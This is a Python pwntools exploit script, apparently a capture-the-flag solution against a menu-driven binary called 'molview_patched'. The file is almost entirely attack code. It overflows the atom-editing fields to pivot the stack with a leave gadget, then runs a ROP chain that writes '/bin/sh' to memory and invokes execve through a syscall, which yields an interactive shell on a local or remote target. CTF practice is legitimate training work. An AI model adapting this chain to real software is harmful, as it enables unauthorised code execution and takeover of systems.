#!/usr/bin/env python3

from pwn import *

exe = ELF("./molview_patched")
rop = ROP(exe)
exe.base = 0x0000000000400000

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r, gdbscript="b *0x0000000000472fb8")
    else:
        r = remote("addr", 1337)

    return r

def add_atom(r):
    r.sendlineafter(b"> ", b"1")

def change_atom(r, index, symbol, name):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", index)
    r.sendlineafter(b": ", symbol)
    r.sendlineafter(b": ", name)

def view_molecule_info(r):
    r.sendlineafter(b"> ", b"3")

def view_molecule_structure(r, idx):
    pass

def modify_bond(r, idx):
    pass

def exit(r, idx):
    pass

def main():
    r = conn()

    MAIN = exe.sym["main"]
    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
    POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
    POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
    LEAVE = rop.find_gadget(['leave', 'ret'])[0]
    WRITE_RSI_RDI = 0x000000000044feff
    RET = rop.find_gadget(['ret'])[0]
    SYSCALL = rop.find_gadget(['syscall'])[0]
    RET = rop.find_gadget(['ret'])[0]
    called_location = 0x004022ab
    writeable_mem = 0x00000000004e5000
    add_atom(r)
    print(POP_RDI)
    
    payload = flat(
        POP_RSI,
        "/bin/sh\x00",
        POP_RDI,
        p64(writeable_mem),
        WRITE_RSI_RDI,
        POP_RSI,
        p64(0x0),
        POP_RAX,
        p64(59),# execve
        RET,
        SYSCALL,
    )

    fgets = 0x00401fd5
    for i in range(8):
        add_atom(r)
    

    
    change_atom(r, b"0", b"A"*8 + p64(LEAVE), b"B"*119 + b"A"*8)
    change_atom(r, b"1", b"A"*8 + p64(MAIN), b"A"*8 + payload)
    view_molecule_info(r)

    r.interactive()


if __name__ == "__main__":
    main()
